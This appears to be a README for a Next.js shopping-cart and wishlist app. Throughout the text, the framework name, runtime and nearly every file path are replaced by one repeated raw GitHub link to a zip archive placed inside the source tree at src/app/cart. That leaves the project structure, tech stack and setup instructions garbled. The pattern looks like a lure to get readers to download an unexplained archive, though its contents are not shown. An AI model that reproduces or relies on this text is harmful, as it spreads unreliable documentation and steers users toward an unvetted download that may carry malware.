# Ecommerce - https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip Shopping Application

A modern, lightweight ecommerce application built with https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip featuring product browsing, wishlist management, and shopping cart functionality.

## Features

- 🛍️ **Product Browsing** - Browse featured products on the home page
- ❤️ **Wishlist Management** - Add/remove products to your wishlist
- 🛒 **Shopping Cart** - Add products to cart with quantity management
- 💰 **Order Summary** - View total amount and item count
- 🌙 **Dark Mode** - Built-in dark theme support
- 📱 **Responsive Design** - Works on desktop, tablet, and mobile
- 💾 **Local Storage** - Cart and wishlist data persists across sessions

## Tech Stack

- **Framework**: https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip 15+
- **Language**: JavaScript/JSX
- **Styling**: Tailwind CSS
- **UI Components**: shadcn/ui
- **Theme**: next-themes
- **State Management**: React Hooks (useState, useEffect)
- **Storage**: Browser LocalStorage

## Project Structure

```
src/
├── app/
│   ├── https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip                 # Home page with product listing
│   ├── [id]https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip          # Product details page
│   ├── https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip          # Shopping cart page
│   ├── https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip      # Wishlist page
│   ├── https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip         # About page
│   ├── https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip       # Contact page
│   ├── https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip              # Root layout with theme provider
│   └── https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip            # Global styles
├── components/
│   ├── layout/
│   │   ├── https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip          # Navigation header
│   │   └── https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip          # Footer component
│   ├── ThemeToggle/
│   │   └── https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip     # Dark/Light mode toggle
│   └── ui/                    # shadcn/ui components
├── hooks/
│   ├── https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip            # Cart state management hook
│   ├── https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip        # Wishlist state management hook
│   └── https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip          # Mobile detection hook
├── lib/
│   └── https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip               # Utility functions
└── public/
    └── https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip          # Static product data
```

## Getting Started

### Prerequisites

- https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip 18+ 
- npm or yarn

### Installation

1. Clone or navigate to the project directory:
```bash
cd ecomarse
```

2. Install dependencies:
```bash
npm install
```

3. Run the development server:
```bash
npm run dev
```

4. Open [http://localhost:3000](http://localhost:3000) in your browser

## Available Scripts

- `npm run dev` - Start development server
- `npm run build` - Build for production
- `npm start` - Start production server
- `npm run lint` - Run ESLint

## Usage

### Home Page
- Browse all featured products
- Click ❤️ to add/remove products from wishlist
- Click "View" to see product details

### Product Details Page
- View full product information
- 🛒 Add to Cart button to add products
- 🤍 Wishlist button to save for later
- Quantity and pricing details

### Shopping Cart
- View all added products
- Adjust quantities with +/− buttons
- Remove individual items
- See real-time total amount
- Proceed to checkout or continue shopping

### Wishlist Page
- View all saved products
- Remove individual items
- Clear entire wishlist
- Quick access to product details

## Hooks Documentation

### useCart()
Manages shopping cart state with localStorage persistence.

```javascript
const { 
  cart,              // Array of items in cart
  addToCart,         // Add product to cart
  removeFromCart,    // Remove product by ID
  updateQuantity,    // Update product quantity
  getTotalPrice,     // Get total cart price
  getTotalItems,     // Get total item count
  clearCart,         // Empty the cart
  isLoaded           // Loading state
} = useCart()
```

### useWishlist()
Manages wishlist state with localStorage persistence.

```javascript
const {
  wishlist,          // Array of wishlist items
  addToWishlist,     // Add product to wishlist
  removeFromWishlist, // Remove product by ID
  isInWishlist,      // Check if product is in wishlist
  getWishlist,       // Get all wishlist items
  clearWishlist,     // Empty the wishlist
  isLoaded           // Loading state
} = useWishlist()
```

## Product Data

Products are stored in `https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip` with the following structure:

```json
{
  "id": 1,
  "name": "Product Name",
  "price": 99.99,
  "category": "Electronics",
  "description": "Product description",
  "image": "https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip",
  "rating": 4.5,
  "reviews": 128,
  "inStock": true
}
```

## Customization

### Adding New Products
Edit `https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip` and add new product objects following the structure above.

### Styling
- Modify Tailwind CSS classes in component files
- Update global styles in `https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip`
- Configure theme in `https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip`

### Components
- UI components are from shadcn/ui
- Custom components are in `src/components/`

## Browser Support

- Chrome (latest)
- Firefox (latest)
- Safari (latest)
- Edge (latest)

## LocalStorage

The application uses browser LocalStorage to persist:
- **cart** - Shopping cart items and quantities
- **wishlist** - Saved products

Data is automatically saved when modified and loaded on page refresh.

## Performance Optimizations

- Client-side rendering for dynamic pages
- Image optimization with https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip Image component
- CSS optimization with Tailwind
- Efficient state management with React hooks

## Troubleshooting

### Data Not Persisting
- Check if localStorage is enabled in your browser
- Clear browser cache and try again

### Products Not Loading
- Verify `https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip` exists and is valid JSON
- Check browser console for errors

### Styling Issues
- Ensure Tailwind CSS is properly configured
- Clear `.next` folder and rebuild: `npm run build`

## Future Enhancements

- [ ] User authentication
- [ ] Payment gateway integration
- [ ] Order history
- [ ] Product filters and search
- [ ] Product reviews and ratings
- [ ] Admin dashboard
- [ ] API backend integration
- [ ] Email notifications

## License

This project is open source and available for educational purposes.

## Support

For issues or questions, please check the browser console for error messages and verify all dependencies are installed correctly.

---

**Created with ❤️ using https://raw.githubusercontent.com/dotsatya/E-commerce_Next/main/src/app/cart/commerce-Next-v3.1.zip and Tailwind CSS**
